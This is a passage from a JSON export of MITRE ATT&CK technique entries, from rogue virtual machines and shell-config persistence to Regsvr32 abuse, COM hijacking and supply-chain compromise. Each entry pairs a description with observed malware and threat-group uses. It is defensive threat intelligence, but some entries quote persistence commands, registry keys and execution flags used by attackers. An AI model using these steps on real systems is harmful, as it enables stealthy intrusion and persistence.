    "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)",
    "similar_words": [
      "Run Virtual Instance"
    ],
    "id": "T1564.006"
  },
  "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db": {
    "name": "Event Triggered Execution",
    "example_uses": [
      "can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users roles and groups.",
      "involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox wget curl tftp telnetd or lua. If the bioset string is not found the related process is terminated.",
      "creates a `.pth` file beginning with the text `import` so that any time another process or script attempts to reference the modified item the malicious code will also run.",
      "`dfhsebxzod` module searches for `.xcodeproj` directories within the users home folder and subdirectories. For each match it locates the corresponding `project.pbxproj` file and embeds an encoded payload into a build rule target configuration or project setting. The payload is later executed during the build process."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
    "similar_words": [
      "Event Triggered Execution"
    ],
    "id": "T1546"
  },
  "attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2": {
    "name": "Unix Shell Configuration Modification",
    "example_uses": [
      "When executing with non-root level permissions  can install persistence by adding a command to the .bashrc file that executes a binary in the `${HOME}/.gvfsd/.profile/` folder.",
      "maintains persistence on an infected machine through rc.local and .bashrc files.",
      "can establish persistence on a compromised host through modifying the `profile` `login` and run command (rc) files associated with the `bash` `csh` and `tcsh` shells.",
      "During  threat actors executed commands on interactive and reverse shells.",
      "Using   adds it's executable to the user's `~/.zshrc_aliases` file (`echo & payload & > ~/zshrc_aliases`) it then adds a line to the .zshrc file to source the `.zshrc_aliases` file (`[ -f $HOME/.zshrc_aliases ] && . $HOME/.zshrc_aliases`). Each time the user starts a new `zsh` terminal session the `.zshrc` file executes the `.zshrc_aliases` file."
    ],
    "description": "Adversaries may establish persistence through executing malicious commands triggered by a users shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the users home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the users environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
    "similar_words": [
      "Unix Shell Configuration Modification"
    ],
    "id": "T1546.004"
  },
  "attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023": {
    "name": "SID-History Injection",
    "example_uses": [
      "MISC::AddSid module can append any SID or user/group account to a user's SID-History.  also utilizes  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.",
      "can add a SID-History to a user if on a domain controller."
    ],
    "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",
    "similar_words": [
      "SID-History Injection"
    ],
    "id": "T1134.005"
  },
  "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166": {
    "name": "Network Boundary Bridging",
    "example_uses": [
      "used `NATBypass` to bypass firewall restrictions and to access compromised systems via RDP.",
      "involved the use of  to bridge network boundaries and overcome NAT.  also involved the use of VPN tunnels with a potentially compromised MSP entity allowing for direct access to critical infrastructure entity networks."
    ],
    "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
    "similar_words": [
      "Network Boundary Bridging"
    ],
    "id": "T1599"
  },
  "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7": {
    "name": "Subvert Trust Controls",
    "example_uses": [
      "has used digital certificates to deliver malware."
    ],
    "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ",
    "similar_words": [
      "Subvert Trust Controls"
    ],
    "id": "T1553"
  },
  "attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0": {
    "name": "Elevated Execution with Prompt",
    "example_uses": [
      "can escalate privileges to root by asking the user for credentials."
    ],
    "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
    "similar_words": [
      "Elevated Execution with Prompt"
    ],
    "id": "T1548.004"
  },
  "attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d": {
    "name": "Firmware",
    "example_uses": [],
    "description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
    "similar_words": [
      "Firmware"
    ],
    "id": "T1592.003"
  },
  "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118": {
    "name": "Encrypted Channel",
    "example_uses": [
      "can use an encrypted beacon to check in with C2.",
      "can engage in encrypted communications with C2.",
      "has used encryption for its C2 channel.",
      "has encrypted traffic with the C2 to prevent network detection.",
      "can receive encrypted commands from C2.",
      "has used an encrypted http proxy in C2 communications.",
      "can use an encrypted channel for C2 communications.",
      "has encrypted their C2 communications.",
      "has used multiple layers of encryption within malware to protect C2 communication.",
      "can support encrypted communications between the client and server.",
      "has encrypted TCP communications to evade detection.",
      "In the   used cryptcat binaries to encrypt their traffic.",
      "can encrypt C2 communications.",
      "has used TLS encryption to initialize a custom protocol for C2 communications.",
      "command and control activity includes transmission of an RSA public key in communication from the server but this is followed by subsequent negotiation stages that represent a form of handshake similar to TLS negotiation.",
      "has encrypted data before sending to the C2 server.",
      "uses a custom encryption algorithm for content sent to command and control infrastructure."
    ],
    "description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
    "similar_words": [
      "Encrypted Channel"
    ],
    "id": "T1573"
  },
  "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec": {
    "name": "Authentication Package",
    "example_uses": [
      "can use Windows Authentication Packages for persistence."
    ],
    "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=&lt;target binary&gt;. The binary will then be executed by the system when the authentication packages are loaded.",
    "similar_words": [
      "Authentication Package"
    ],
    "id": "T1547.002"
  },
  "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab": {
    "name": "Regsvr32",
    "example_uses": [
      "has used `regsvr32` to execute scripts.",
      "can use Regsvr32 to execute malicious DLLs.",
      "has used regsvr32.exe to load malicious DLLs.",
      "Some  versions have an embedded DLL known as MockDll that uses  and regsvr32 to execute another payload.",
      "can use Regsvr32 to execute additional payloads.",
      "has used regsvr32.exe to launch malicious DLLs.",
      "has been executed using `regsvr32.exe`.",
      "can use `regsvr32.exe` for DLL execution.",
      "can be loaded through regsvr32.exe.",
      "can use `regsvr32.exe` to initiate malicious code.",
      "variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.",
      "has used regsvr32.exe to execute a server variant of  in victim networks.",
      "uses regsvr32.exe to run a .sct file for execution.",
      "has used regsvr32.exe to execute scripts.",
      "During   used `regsvr32` to execute malware.",
      "has used regsvr32.exe to execute components of VirtualBox.",
      "has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.",
      "has used `regsvr32.exe /s /i` to execute malicious payloads.",
      "has used regsvr32.exe to execute malicious DLLs.",
      "During  the threat actors employed code that used `regsvr32` for execution.",
      "has used regsvr32 for execution.",
      "has executed malware with regsvr32s.",
      "has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s.",
      "has used `regsvr32.exe` to trigger the execution of a malicious script.",
      "has used regsvr32.exe to execute the malicious DLL.",
      "created a  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.",
      "can run a remote scriptlet that drops a file and executes it via regsvr32.exe.",
      "executes using regsvr32.exe called from the  persistence mechanism.",
      "can call regsvr32.exe for execution.",
      "can use regsvr32 for executing scripts.",
      "used Regsvr32 to bypass application control techniques.",
      "uses RegSvr32 to execute the DLL payload.",
      "can create SCT files for installation via `Regsvr32` to deploy new Grunt listeners.",
      "uses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated with  nodes."
    ],
    "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
    "similar_words": [
      "Regsvr32"
    ],
    "id": "T1218.010"
  },
  "attack-pattern--ba04e672-da86-4e69-aa15-0eca5db25f43": {
    "name": "Exfiltration to Text Storage Sites",
    "example_uses": [],
    "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and other information.  Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.",
    "similar_words": [
      "Exfiltration to Text Storage Sites"
    ],
    "id": "T1567.003"
  },
  "attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884": {
    "name": "Software",
    "example_uses": [
      "has captured the user-agent strings from visitors to their phishing sites.",
      "has researched software code to enable supply-chain operations most notably for the 2017  attack.  also collected a list of computers using specific software as part of its targeting efforts.",
      "has inserted a malicious script within compromised websites to collect potential victim information such as browser type system language Flash Player version and other data."
    ],
    "description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Software"
    ],
    "id": "T1592.002"
  },
  "attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974": {
    "name": "Spearphishing Voice",
    "example_uses": [
      "During   impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.",
      "has initiated voice calls with victims posing as IT support to prompt users to download and execute scripts and other tools for initial access."
    ],
    "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",
    "similar_words": [
      "Spearphishing Voice"
    ],
    "id": "T1566.004"
  },
  "attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2": {
    "name": "Exploits",
    "example_uses": [
      "has exploited zero-day vulnerabilities for initial access.",
      "has rapidly transformed and adapted public exploit proof-of-concept code for new vulnerabilities and utilized them against target networks."
    ],
    "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
    "similar_words": [
      "Exploits"
    ],
    "id": "T1587.004"
  },
  "attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3": {
    "name": "Social Media",
    "example_uses": [
      "has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.",
      "has copied data from social media sites to impersonate targeted individuals.",
      "For   used LinkedIn to identify and target employees within a chosen organization."
    ],
    "description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victims into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
    "similar_words": [
      "Social Media"
    ],
    "id": "T1593.001"
  },
  "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae": {
    "name": "Component Object Model Hijacking",
    "example_uses": [
      "Some variants of  achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.",
      "has modified ComSysApp service to load the malicious DLL payload.",
      "has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.",
      "has created the `HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32` Registry key for persistence.",
      "can perform COM hijacking by setting the path to itself to the `HKCU\\Software\\Classes\\Folder\\shell\\open\\command` key with a `DelegateExecute` parameter.",
      "samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.",
      "has created the `HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19}` Registry key for persistence.",
      "uses COM hijacking as a method of persistence.",
      "can use COM hijacking to establish persistence.",
      "has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.",
      "can add a CLSID key for payload execution through `Registry.CurrentUser.CreateSubKey(Software\\\\Classes\\\\CLSID\\\\{ + clsid + }\\\\InProcServer32)`.",
      "has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A})."
    ],
    "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
    "similar_words": [
      "Component Object Model Hijacking"
    ],
    "id": "T1546.015"
  },
  "attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161": {
    "name": "Credentials",
    "example_uses": [
      "has harvested user's login credentials.",
      "gathered credentials from two victims that they then attempted to validate across 75 different websites.  has also collected credentials from over 900 Fortinet VPN servers in the US Europe and Israel.",
      "To support initial access  gained access to databases with information about existing accounts as well as plaintext and hashed passwords.",
      "has collected compromised credentials to use for targeting efforts.",
      "For the   conducted credential theft operations to obtain credentials to be used for access to victim environments.",
      "has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials.",
      "has collected credentials for the target organization from previous breaches for use in brute force attacks.",
      "During   sent phishing messages via SMS to steal credentials."
    ],
    "description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). ",
    "similar_words": [
      "Credentials"
    ],
    "id": "T1589.001"
  },
  "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00": {
    "name": "Compromise Software Supply Chain",
    "example_uses": [
      "gained access to production environments where they could inject malicious code into legitimate signed files and widely distribute them to end users.",
      "has compromised legitimate web browser updates to deliver a backdoor.",
      "has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.",
      "has been packaged with a legitimate tax preparation software.",
      "malware was designed and used to insert  into software builds of the SolarWinds Orion IT management product.",
      "has distributed  by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.",
      "was added to a legitimate signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.",
      "has placed trojanized installers for control system software on legitimate vendor app stores.",
      "has compromised the Able Desktop installer to gain access to victim's environments.",
      "During the   gained initial network access to some victims via a trojanized update of SolarWinds Orion software.",
      "has gained initial access by compromising a victim's software supply chain.",
      "is associated with several supply chain compromises using malicious updates to compromise victims.",
      "has distributed a trojanized version of PuTTY software for initial access to victims."
    ],
    "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
    "similar_words": [
      "Compromise Software Supply Chain"
    ],
    "id": "T1195.002"
  },
